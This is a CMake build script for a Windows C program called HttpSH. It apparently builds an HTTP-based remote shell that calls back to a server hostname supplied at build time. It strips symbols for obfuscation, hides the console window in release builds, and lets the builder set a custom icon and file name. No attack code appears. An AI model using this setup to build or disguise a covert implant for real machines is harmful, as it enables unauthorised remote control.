cmake_minimum_required(VERSION 3.10)

# Genearete "compile_commands.json" for ease of C lintering
#set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

#set(CMAKE_SYSTEM_NAME Windows)
#set(CMAKE_C_COMPILER x86_64-w64-mingw32-gcc)

# Stripping for better Obfuscation
#set(CMAKE_C_FLAGS_RELEASE "${CMAKE_C_FLAGS_RELEASE} -s")
#set(CMAKE_C_FLAGS_MINSIZEREL "${CMAKE_C_FLAGS_MINSIZEREL} -s")

if(NOT CMAKE_BUILD_TYPE)
  set(CMAKE_BUILD_TYPE Release)
endif()

# Setting project information
project(HttpSH VERSION 1.1.0 LANGUAGES C)

# Setting config file to automatically generate Hostname, Port, Path, ... header file
set(CONFIGFILE "Config.h")


# Getting compliation options from CLI
option(EXENAME "Executable File Name")
if(NOT EXENAME)
    set(EXENAME ${PROJECT_NAME})
endif()

set(HOSTNAME "" CACHE STRING "Server Hostname")

option(PORT "Server Port")
if(NOT PORT)
  set(PORT 80)
endif()

option(PATH "Receiving Path")
if(NOT PATH)
  set(PATH "/")
endif()

if(NOT ICON)
    set( ICON "${PROJECT_SOURCE_DIR}/resource/logo.ico")
endif()

# Throw error when there was no HOSTNAME in options ( REQUIRED )
if(HOSTNAME STREQUAL "")
  message(SEND_ERROR "No Hostname Specified!\n use -DHOSTNAME=\"Target IP/Hostname\"")
endif()

# Auto generate config header
configure_file("${PROJECT_SOURCE_DIR}/Config.h.in" ${CONFIGFILE})
configure_file("${PROJECT_SOURCE_DIR}/resource/logo.rc.in" "logo.rc")

file(GLOB src 
  "${PROJECT_SOURCE_DIR}/src/*.c"
  "${PROJECT_BINARY_DIR}/logo.rc"
  )

file(GLOB include 
    "${PROJECT_SOURCE_DIR}/include/*.h"
    "${PROJECT_SOURCE_DIR}/include/json/*.h"
)

if(NOT CMAKE_BUILD_TYPE)
  set(CMAKE_BUILD_TYPE "Release" CACHE STRING
      "Choose the type of build, options are: Debug Release RelWithDebInfo MinSizeRel."
      FORCE)
endif(NOT CMAKE_BUILD_TYPE)

# Create executable

if(${CMAKE_BUILD_TYPE} STREQUAL "Debug")
    add_executable(${EXENAME} ${src} ${include})
elseif(${CMAKE_BUILD_TYPE} STREQUAL "RelWithDebInfo")
    add_executable(${EXENAME} ${src} ${include})
else()
    add_executable(${EXENAME} WIN32 ${src} ${include})
endif()

# Pass CONFIGFILE to project as a preprocessor ( to be included easily )
target_compile_definitions(${EXENAME} PRIVATE CONFIG="${CONFIGFILE}")

# Pass build type to project
if(${CMAKE_BUILD_TYPE} STREQUAL "Debug")
  add_compile_definitions(DEBUG=1)
elseif(${CMAKE_BUILD_TYPE} STREQUAL "RelWithDebInfo")
  add_compile_definitions(DEBUG=1)
endif()

# Add project binary directory to include path ( for including CONFIGFILE )
target_include_directories(${EXENAME} PUBLIC 
  "${PROJECT_SOURCE_DIR}/include"
  ${PROJECT_BINARY_DIR}
  )

target_link_directories( ${EXENAME} PRIVATE "${PROJECT_SOURCE_DIR}/lib")
target_link_libraries( ${EXENAME} PRIVATE winhttp json)
